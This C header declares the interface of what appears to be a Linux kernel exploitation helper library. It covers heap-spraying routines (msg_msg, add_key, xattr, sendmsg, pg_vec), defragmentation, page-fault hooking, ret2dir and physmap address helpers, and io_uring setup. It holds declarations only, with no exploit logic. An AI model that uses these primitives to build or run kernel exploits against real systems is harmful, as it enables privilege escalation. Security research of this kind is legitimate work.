#define u32 unsigned int 
#define u64 unsigned long long
#define i32 int 
#define i64 long long

struct cpu_info {
	int cpuid;
	int nr_running;
};

struct spray_struct {
	void *payload;
	size_t len;
	u32 num;
	int stage;
};

struct msg_spray_t {
	struct msg_spray_t *next;
	int msgqid;
	void *payload;
	size_t len;
	u32 num;
};

struct sendmsg_spray_t {
	int *start_flag;
	int *ready_proc_num;
};

struct cq_ring_t {
	u32 *head;
	u32 *tail;
	u32 *ring_mask;
	u32 *ring_entries;
	struct io_uring_cqe *cqes;
};

struct sq_ring_t {
	u32 *head;
	u32 *tail;
	u32 *ring_mask;
	u32 *ring_entries;
	u32 *flags;
	u32 *array;
};

struct uring_mgr_t {
	int fd;
	struct sq_ring_t sq_ring;
	struct cq_ring_t cq_ring;
	struct io_uring_sqe *sqes;
	size_t sqe_array_size;
	void *ring;
	size_t ring_size;
};

#define likely(x) __builtin_expect(!!(x), 1)
#define unlikely(x) __builtin_expect(!!(x), 0)

#ifndef pid_t
#define pid_t int
#define LIBEXP_PID_T
#endif

void error_out(const char *fmt, ...);
void rand_str(char *dest, size_t length);
int write_file(const char* fname, const char* fmt, ...);
void hex_print(void *addr, size_t len);
pid_t clean_fork(void);
void *umem_alloc(void *addr, size_t size);

void ts_fence(void);
void set_cpu(int);
void unset_cpu(void);
void reload_cpu_info(void);
void setup_sandbox(void);
void anti_swapper(void (*hook)(void));
void suppress_int(void (*hook)(void));

struct msg_spray_t * msg_spray(void *payload, size_t plen, u32 num);
struct msg_spray_t * msg_spray_max(void *payload, size_t plen);
void msg_spray_clean(struct msg_spray_t *);
void add_key_spray_num(void *payload, size_t size, u32 num);
void add_key_desc_spray_num(char *desc, u32 num);
void defragment(size_t size, u32 num);
void xattr_defragment(size_t size, u32 num);
void xattr_spray(void *payload, size_t size, u32 num);
void init_pagefault(void);
void *reg_pagefault(void *wanted, void *src_page, size_t len, void (*hook)(void *));
void nonsense(void);

void init_univ_spray(void);
struct spray_struct *prepare_univ_spray(void *payload, size_t len, u32 num, void (*hook)(void *));
void univ_spray(struct spray_struct *spray);
void stress_all_caches();
u64 heap_to_physmap(u64 heap_ptr);
void *ret2dir_setup(void *, u64);
struct sendmsg_spray_t *prepare_sendmsg_spray(u32, void *, size_t);
void sendmsg_spray(struct sendmsg_spray_t *);
void sendmsg_spray_transient(u32, void *, size_t);
void cleanup_msgs(void);

int pg_vec_spray(void *src_buf, u32 buf_size, u32 num);
void setup_pg_vec();

void uring_mgr_setup(struct uring_mgr_t *mgr, u32 entries, int poll);
void uring_submit(struct uring_mgr_t *mgr, struct io_uring_sqe *sqes, u32 num);
int uring_enter(struct uring_mgr_t *mgr, u32 to_submit, u32 min_complete);

#ifdef LIBEXP_PID_T
#undef pid_t
#endif

extern u64 cpu_num;
extern struct cpu_info *idle_cpus;
extern size_t kmalloc_size_array[13];
